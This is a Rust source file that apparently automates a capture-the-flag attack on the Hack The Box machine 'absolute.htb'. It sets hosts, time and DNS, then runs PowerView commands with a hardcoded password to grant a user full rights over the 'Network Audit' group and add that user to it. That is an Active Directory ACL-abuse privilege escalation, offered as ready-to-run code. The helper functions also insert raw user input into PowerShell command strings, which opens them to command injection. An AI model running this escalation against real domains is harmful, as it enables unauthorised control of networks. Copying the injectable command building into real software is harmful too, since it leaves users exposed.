use std::process::Command;
use std::io::{stdin, Write};

pub fn update_hosts_file() {
    // Ask the user for the IP address
    print!("Enter the IP address of absolute.htb: ");
    let _ = std::io::stdout().flush();
    let mut ip = String::new();
    stdin().read_line(&mut ip).expect("Failed to read the input");
    let ip = ip.trim();

    // Open the hosts file with administrator privileges
    let output = Command::new("powershell")
        .args(&[
            "-Command",
            &format!(
                "Add-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Value '{} absolute.htb'",
                ip
            ),
        ])
        .output()
        .expect("failed to execute powershell command");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}

pub fn sync_windows_time() {
    let output = Command::new("cmd")
        .args(&["/C", "net", "time", "\\\\absolute.htb", "/set", "/yes"])
        .output()
        .expect("failed to execute net time command");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));
}

pub fn set_primary_dns() {
    // Ask the user for the IP address
    print!("Enter the IP address of absolute.htb: ");
    let _ = std::io::stdout().flush();
    let mut ip = String::new();
    stdin().read_line(&mut ip).expect("Failed to read the input");
    let ip = ip.trim();

    // Obtain the name of the OpenVPN LAN adapter
    let output = Command::new("powershell")
        .args(&[
            "-Command",
            "Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and $_.Description -like '*OpenVPN*'} | Select-Object -ExpandProperty Name",
        ])
        .output()
        .expect("failed to execute powershell command");

    let adapter_name = String::from_utf8_lossy(&output.stdout).trim().to_string();

    // Set the primary DNS for the OpenVPN LAN adapter
    let dns_output = Command::new("powershell")
        .args(&[
            "-Command",
            &format!(
                "Set-DnsClientServerAddress -InterfaceAlias '{}' -ServerAddresses '{}'",
                adapter_name, ip
            ),
        ])
        .output()
        .expect("failed to execute powershell command to set primary DNS");

    // Print the command output to the console
    let dns_output_str = String::from_utf8_lossy(&dns_output.stdout);
    println!("{}", dns_output_str);
    println!("{}", String::from_utf8_lossy(&dns_output.stderr));
}

pub fn run_powershell_commands() {
    // Prepare the PowerShell commands and custom messages
    let commands_and_messages = vec![
        ("Import-Module .\\PowerView.ps1", "PowerView module imported"),
        (
            r#"$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force"#,
            "$SecPassword variable set",
        ),
        (
            r#"$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)"#,
            "$Cred variable set",
        ),
        (
            r#"Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController absolute.htb -PrincipalIdentity "m.lovegod""#,
            "DomainObjectAcl set",
        ),
        (
            r#"Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server absolute.htb"#,
            "Added m.lovegod to Network Audit group",
        ),
    ];

    // Execute each command and print the custom message
    for (i, (command, message)) in commands_and_messages.iter().enumerate() {
        let output = Command::new("powershell")
            .arg("-Command")
            .arg(command)
            .output()
            .expect("failed to execute PowerShell command");

        // Print the custom message
        println!("Command {}: {}", i + 1, message);

        // Print the command output to the console
        let output_str = String::from_utf8_lossy(&output.stdout);
        println!("{}", output_str);
        println!("{}", String::from_utf8_lossy(&output.stderr));
    }
}
